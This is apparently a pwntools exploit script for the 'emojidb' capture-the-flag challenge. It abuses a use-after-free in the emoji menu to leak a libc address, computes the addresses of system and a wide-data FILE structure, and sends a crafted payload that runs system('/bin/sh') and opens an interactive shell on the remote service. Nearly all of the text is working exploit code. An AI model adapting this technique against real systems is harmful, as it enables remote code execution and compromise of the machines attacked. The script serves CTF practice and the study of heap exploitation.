# coding:utf-8
from pwn import *
import ctypes
context.arch = 'amd64'

LIBC = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
TARGET = './emojidb'
HOST = 'emojidb.pwni.ng'
# HOST = '172.17.0.2'
PORT = 9876

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))


def alloc(size, text):
    r.sendlineafter("🛑❓", "🆕")
    r.sendafter("📏❓", str(size))
    r.sendline(text)

def delete(idx):
    r.sendlineafter("🛑❓", "🆓")
    r.sendlineafter("🔢❓", str(idx))

def show(idx):
    r.sendlineafter("🛑❓", "📖")
    r.sendlineafter("🔢❓", str(idx))

def decode(array) :
    ptr = ctypes.create_string_buffer(len(array)*4)
    LIBC.mbstowcs(ptr,array,len(array)*4)
    return ptr.value

def encode(array) :
    ptr = ctypes.create_string_buffer(len(array)*4)
    LIBC.wcstombs(ptr,array,len(array)*4)
    return ptr.value


LIBC.setlocale(0, "en_US.UTF-8")
while(1):
    r = start()
    alloc(260, "🆕❓🆕")
    alloc(4, "🆕❓🆕")

    delete(1)
    show(1)
    leak = r.recvuntil('🆕📖')

    p = decode(leak[:9])
    print leak[:9]
    if p != '?':
        break
    r.close()

context.log_level = 'debug'
pause()
if args.D:
    debug(r, [])
    
leak = u64(p+'\x00'*2)
dbg("leak")
base = leak - 0x3ebca0 
system = base + 0x4f440
IO_wide_data_1 = base + 0x3eb9e8

for i in range(4):
    alloc(4, "❓")

payload  = ''
payload += 'a'*8
payload += 'b'*8
payload += 'c'*8
payload += p64(IO_wide_data_1) * 8
payload += 'A'*8
payload += 'B'*8
payload += 'C'*8
payload += 'D'*8
payload += 'E'*8
payload += "/bin/sh\x00"
payload += p64(system)
r.sendlineafter("🛑❓", encode(payload))

r.interactive()
r.close()
